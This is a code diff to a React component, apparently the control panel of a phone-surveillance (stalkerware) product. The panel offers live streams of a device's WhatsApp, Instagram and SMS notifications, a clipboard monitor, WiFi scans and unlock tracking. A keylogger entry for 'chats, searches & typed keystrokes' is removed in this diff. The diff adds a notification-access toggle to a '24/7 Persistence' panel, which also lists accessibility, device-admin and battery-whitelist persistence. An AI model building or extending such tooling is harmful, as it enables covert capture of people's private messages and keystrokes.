@@ -16,7 +16,7 @@ interface Props {
   isOpen: boolean; onClose: () => void; deviceId: string;
   initialConfig?: DeviceTelemetryConfig;
   tabPrefs?: Record<string, boolean>;
-  persistenceStatus?: { isAdmin?: boolean; isAccessibility?: boolean; isBatteryWhitelisted?: boolean };
+  persistenceStatus?: { isAdmin?: boolean; isAccessibility?: boolean; isBatteryWhitelisted?: boolean; isNotificationActive?: boolean };
   onTogglePersistence?: (key: string, val: boolean) => void;
   onSaved?: (cfg: DeviceTelemetryConfig, updatedTabPrefs?: Record<string, boolean>) => void;
 }
@@ -70,7 +70,6 @@ export const DeviceTelemetryControlsModal: React.FC<Props> = ({
 
   const TELEMETRY_ITEMS: { key: keyof DeviceTelemetryConfig; label: string; desc: string; icon: any }[] = [
     { key: "notifications", label: "Live Notifications Stream", desc: "WhatsApp, Instagram, SMS alerts", icon: Bell },
-    { key: "keylogger", label: "Live Typed Text / Keylogger", desc: "Chats, searches & typed keystrokes", icon: Keyboard },
     { key: "clipboard", label: "Clipboard Monitor", desc: "Text & links copied on device", icon: Clipboard },
     { key: "wifi", label: "WiFi & Surrounding Networks", desc: "Connected WiFi SSID & router scans", icon: Wifi },
     { key: "lock_events", label: "Lock Screen Activity", desc: "Screen ON/OFF & unlock timestamps", icon: Lock },
@@ -95,11 +94,16 @@ export const DeviceTelemetryControlsModal: React.FC<Props> = ({
             <Sliders className="w-3.5 h-3.5 text-amber-500 dark:text-[#FFFC00]" />
             Anti-Sleep &amp; 24/7 Persistence Status
           </p>
-          <div className="grid grid-cols-3 gap-1.5 text-[11px] font-mono">
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5 text-[11px] font-mono">
             <div onClick={() => onTogglePersistence?.("is_accessibility_active", !persistenceStatus.isAccessibility)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isAccessibility ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
               {persistenceStatus.isAccessibility ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
               <span className="font-semibold text-[10px]">Accessibility</span>
               <span className="text-[9px] opacity-75">{persistenceStatus.isAccessibility ? "Active ✓" : "Off →"}</span>
+            </div>
+            <div onClick={() => onTogglePersistence?.("is_notification_active", !persistenceStatus.isNotificationActive)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isNotificationActive ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
+              {persistenceStatus.isNotificationActive ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
+              <span className="font-semibold text-[10px]">Notifications</span>
+              <span className="text-[9px] opacity-75">{persistenceStatus.isNotificationActive ? "Active ✓" : "Off →"}</span>
             </div>
             <div onClick={() => onTogglePersistence?.("is_device_admin", !persistenceStatus.isAdmin)} className={`p-1.5 rounded-xl border flex flex-col items-center justify-center gap-0.5 text-center cursor-pointer select-none transition-all active:scale-95 ${persistenceStatus.isAdmin ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-600 dark:text-emerald-400" : "bg-rose-500/10 border-rose-500/30 text-rose-600 dark:text-rose-400"}`}>
               {persistenceStatus.isAdmin ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
